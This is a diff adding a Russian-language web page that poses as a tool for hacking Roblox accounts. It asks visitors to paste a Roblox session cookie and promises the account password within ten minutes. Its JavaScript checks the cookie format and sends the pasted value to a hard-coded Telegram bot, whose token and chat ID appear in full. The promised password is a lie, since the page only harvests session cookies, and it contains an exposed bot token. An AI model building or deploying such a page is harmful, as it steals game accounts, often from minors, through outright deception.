@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+ <html lang="ru">
+ <head>
+     <meta charset="UTF-8">
+     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <title>Roblox Cookies</title>
+     <style>
+         :root {
+             --primary-color: #4a6fa5;
+             --secondary-color: #5cb8a7;
+             --text-color: #e0e0e0;
+             --bg-color: #121212;
+             --particle-color: rgba(92, 184, 167, 0.6);
+         }
+         
+         body {
+             background-color: var(--bg-color);
+             font-family: 'Arial', sans-serif;
+             color: var(--text-color);
+             margin: 0;
+             min-height: 100vh;
+             background-image: 
+                 radial-gradient(circle at 25% 25%, rgba(74, 111, 165, 0.05) 0%, transparent 50%),
+                 radial-gradient(circle at 75% 75%, rgba(92, 184, 167, 0.05) 0%, transparent 50%);
+             position: relative;
+             overflow-y: auto;
+         }
+ 
+         .particle {
+             position: absolute;
+             background-color: var(--particle-color);
+             border-radius: 50%;
+             pointer-events: none;
+             animation: float-up linear infinite;
+         }
+ 
+         @keyframes float-up {
+             to {
+                 transform: translateY(-100vh);
+             }
+         }
+ 
+         .container {
+             position: relative;
+             width: 90%;
+             max-width: 800px;
+             padding: 30px;
+             border: 1px solid var(--primary-color);
+             border-radius: 12px;
+             box-shadow: 0 0 10px rgba(74, 111, 165, 0.3);
+             overflow: hidden;
+             background-color: rgba(18, 18, 18, 0.8);
+             backdrop-filter: blur(4px);
+             transition: all 0.5s ease;
+             z-index: 10;
+             margin: 30px auto;
+         }
+ 
+         .video-container {
+             margin-top: 25px;
+             padding-top: 20px;
+             border-top: 1px solid rgba(74, 111, 165, 0.3);
+         }
+ 
+         .video-wrapper {
+             position: relative;
+             padding-bottom: 56.25%;
+             height: 0;
+             overflow: hidden;
+             border-radius: 8px;
+             border: 1px solid var(--primary-color);
+         }
+ 
+         .video-wrapper iframe {
+             position: absolute;
+             top: 0;
+             left: 0;
+             width: 100%;
+             height: 100%;
+             border: none;
+         }
+ 
+         .container:hover {
+             box-shadow: 0 0 15px rgba(74, 111, 165, 0.4), 
+                         0 0 10px rgba(92, 184, 167, 0.2);
+         }
+ 
+         .header {
+             text-align: center;
+             margin-bottom: 30px;
+         }
+ 
+         .animated-text {
+             color: var(--primary-color);
+             font-size: 2.2rem;
+             font-weight: 500;
+             position: relative;
+             animation: soft-glow 3s ease-in-out infinite alternate;
+             margin-bottom: 15px;
+             opacity: 0.9;
+         }
+ 
+         .subtitle {
+             color: var(--secondary-color);
+             font-size: 1.1rem;
+             animation: subtitle-soft-glow 4s ease-in-out infinite alternate;
+             opacity: 0.8;
+         }
+ 
+         .content {
+             display: flex;
+             flex-direction: column;
+             gap: 15px;
+         }
+ 
+         .input-group {
+             position: relative;
+             margin-bottom: 20px;
+         }
+ 
+         .input-group label {
+             position: absolute;
+             top: -8px;
+             left: 12px;
+             background-color: var(--bg-color);
+             padding: 0 8px;
+             color: var(--secondary-color);
+             font-size: 0.85rem;
+             opacity: 0.9;
+         }
+ 
+         .input-group textarea {
+             width: 100%;
+             padding: 12px;
+             background-color: rgba(255, 255, 255, 0.05);
+             border: 1px solid var(--primary-color);
+             border-radius: 6px;
+             color: var(--text-color);
+             font-size: 0.95rem;
+             transition: all 0.3s ease;
+             min-height: 150px;
+         }
+ 
+         .input-group textarea:focus {
+             outline: none;
+             border-color: var(--secondary-color);
+             box-shadow: 0 0 5px rgba(92, 184, 167, 0.3);
+         }
+ 
+         .btn {
+             background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+             color: white;
+             border: none;
+             padding: 12px 25px;
+             border-radius: 6px;
+             font-size: 0.95rem;
+             font-weight: 500;
+             cursor: pointer;
+             transition: all 0.3s ease;
+             text-transform: uppercase;
+             letter-spacing: 0.5px;
+             margin-top: 5px;
+             opacity: 0.9;
+             animation: btn-soft-glow 3s ease-in-out infinite alternate;
+         }
+ 
+         .btn:hover {
+             transform: translateY(-2px);
+             box-shadow: 0 3px 8px rgba(92, 184, 167, 0.2);
+             opacity: 1;
+         }
+ 
+         .rules {
+             margin-top: 25px;
+             border-top: 1px solid rgba(74, 111, 165, 0.3);
+             padding-top: 15px;
+         }
+ 
+         .rules h3 {
+             color: var(--secondary-color);
+             margin-bottom: 12px;
+             font-size: 1.1rem;
+             opacity: 0.9;
+         }
+ 
+         .rules-list {
+             list-style-type: none;
+             padding: 0;
+         }
+ 
+         .rules-list li {
+             position: relative;
+             padding-left: 20px;
+             margin-bottom: 8px;
+             color: var(--text-color);
+             font-size: 0.9rem;
+             opacity: 0.8;
+         }
+ 
+         .rules-list li:before {
+             content: "›";
+             position: absolute;
+             left: 0;
+             color: var(--primary-color);
+         }
+ 
+         @keyframes soft-glow {
+             from {
+                 text-shadow: 0 0 3px rgba(74, 111, 165, 0.3), 
+                              0 0 5px rgba(74, 111, 165, 0.2);
+             }
+             to {
+                 text-shadow: 0 0 8px rgba(74, 111, 165, 0.4), 
+                              0 0 12px rgba(74, 111, 165, 0.3);
+             }
+         }
+ 
+         @keyframes subtitle-soft-glow {
+             from {
+                 text-shadow: 0 0 2px rgba(92, 184, 167, 0.2);
+             }
+             to {
+                 text-shadow: 0 0 5px rgba(92, 184, 167, 0.3);
+             }
+         }
+ 
+         @keyframes btn-soft-glow {
+             from {
+                 box-shadow: 0 0 5px rgba(74, 111, 165, 0.3);
+             }
+             to {
+                 box-shadow: 0 0 10px rgba(92, 184, 167, 0.3);
+             }
+         }
+ 
+         .container:before {
+             content: '';
+             position: absolute;
+             top: -50%;
+             left: -50%;
+             width: 200%;
+             height: 200%;
+             background: linear-gradient(
+                 to bottom right,
+                 rgba(74, 111, 165, 0.03),
+                 rgba(74, 111, 165, 0),
+                 rgba(92, 184, 167, 0.03)
+             );
+             transform: rotate(30deg);
+             animation: bg-soft-animation 20s infinite linear;
+             z-index: -1;
+         }
+ 
+         @keyframes bg-soft-animation {
+             0% {
+                 transform: rotate(0deg) translate(-5%, -5%);
+             }
+             100% {
+                 transform: rotate(360deg) translate(-5%, -5%);
+             }
+         }
+ 
+         @media (max-width: 768px) {
+             .container {
+                 width: 95%;
+                 padding: 20px 15px;
+             }
+             
+             .animated-text {
+                 font-size: 1.8rem;
+             }
+             
+             .subtitle {
+                 font-size: 1rem;
+             }
+         }
+     </style>
+ </head>
+ <body>
+     <div class="container">
+         <div class="header">
+             <div class="animated-text">🍪 Roblox Cookies 🍪</div>
+             <div class="subtitle">💲Введите Cookies Roblox для продолжения получения пароля от аккаунта💲</div>
+         </div>
+         
+         <div class="content">
+             <div class="input-group">
+                 <label for="codeInput">Cookies аккаунта</label>
+                 <textarea id="codeInput" placeholder="🍪 Введите cookie аккаунта который хотите взломать 🍪"></textarea>
+             </div>
+             
+             <button class="btn" onclick="sendCode()">Отправить</button>
+         </div>
+         
+         <div class="rules">
+             <h3>Правила использования:</h3>
+             <ul class="rules-list">
+                 <li>Поле должно быть обязательно заполнено</li>
+                 <li>Cookies Roblox должен быть действительным</li>
+                 <li>В сообщении должен быть ТОЛЬКО Cookies Roblox</li>
+                 <li>Максимальная длина сообщения - 500 символов</li>
+                 <li>Результат будет доступен через 10 минут</li>
+             </ul>
+         </div>
+ 
+         <div class="video-container">
+             <h3 style="color: var(--secondary-color); margin-bottom: 15px; text-align: center;">Видео-инструкция , если не работает видео вот ссылка на ролик https://www.youtube.com/watch?v=6kdeqQiCUCc</h3>
+             <div class="video-wrapper">
+                 <iframe src="https://www.youtube.com/watch?v=6kdeqQiCUCc" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+             </div>
+         </div>
+     </div>
+ 
+     <script>
+         function createParticles() {
+             const particleCount = 50;
+             const container = document.body;
+             
+             for (let i = 0; i < particleCount; i++) {
+                 const particle = document.createElement('div');
+                 particle.classList.add('particle');
+                 
+                 const size = Math.random() * 3 + 2;
+                 particle.style.width = `${size}px`;
+                 particle.style.height = `${size}px`;
+                 
+                 particle.style.left = `${Math.random() * 100}vw`;
+                 particle.style.bottom = `-10px`;
+                 
+                 const duration = Math.random() * 20 + 10;
+                 particle.style.animationDuration = `${duration}s`;
+                 
+                 const delay = Math.random() * 15;
+                 particle.style.animationDelay = `${delay}s`;
+                 
+                 const opacity = Math.random() * 0.5 + 0.3;
+                 particle.style.opacity = opacity;
+                 
+                 container.appendChild(particle);
+             }
+         }
+ 
+         async function sendCode() {
+             const codeInput = document.getElementById("codeInput");
+             const code = codeInput.value.trim();
+             
+             if (!code) {
+                 alert("🍪 Пожалуйста, введите текст, чтобы получить пароль от аккаунта! 🍪");
+                 return;
+             }
+ 
+             // Проверка формата Cookie
+             if (!code.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.-")) {
+                 alert("❌ Сообщение не было отправлено, так как неверный формат Cookie.");
+                 return;
+             }
+ 
+             const botToken = "7837534766:AAG0479OD3cPaR3s30qTy3EF3WRffkniOSo";
+             const chatId = -1002567382962;
+             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+ 
+             try {
+                 const response = await fetch(url, {
+                     method: 'POST',
+                     headers: {
+                         'Content-Type': 'application/json',
+                     },
+                     body: JSON.stringify({
+                         chat_id: chatId,
+                         text: code,
+                         parse_mode: 'HTML'
+                     })
+                 });
+ 
+                 const data = await response.json();
+                 
+                 if (data.ok) {
+                     alert("✅ Сообщение успешно отправлено, через несколько минут на этом сайте вы получите пароль от аккаунта. Время ожидания - 10 минут!");
+                     codeInput.value = "";
+                 } else {
+                     alert(`❌ Ошибка: ${data.description || "Неизвестная ошибка"}`);
+                 }
+             } catch (error) {
+                 alert("⚠️ Ошибка сети: " + error.message);
+                 console.error("Ошибка:", error);
+             }
+         }
+ 
+         document.addEventListener('DOMContentLoaded', () => {
+             createParticles();
+             
+             const container = document.querySelector('.container');
+             container.style.opacity = '0';
+             container.style.transform = 'translateY(10px)';
+             
+             setTimeout(() => {
+                 container.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
+                 container.style.opacity = '1';
+                 container.style.transform = 'translateY(0)';
+             }, 100);
+             
+             const btn = document.querySelector('.btn');
+             btn.addEventListener('mouseenter', () => {
+                 btn.style.animation = 'none';
+                 setTimeout(() => {
+                     btn.style.animation = 'btn-soft-glow 3s ease-in-out infinite alternate';
+                 }, 10);
+             });
+         });
+     </script>
+ </body>
+ </html>
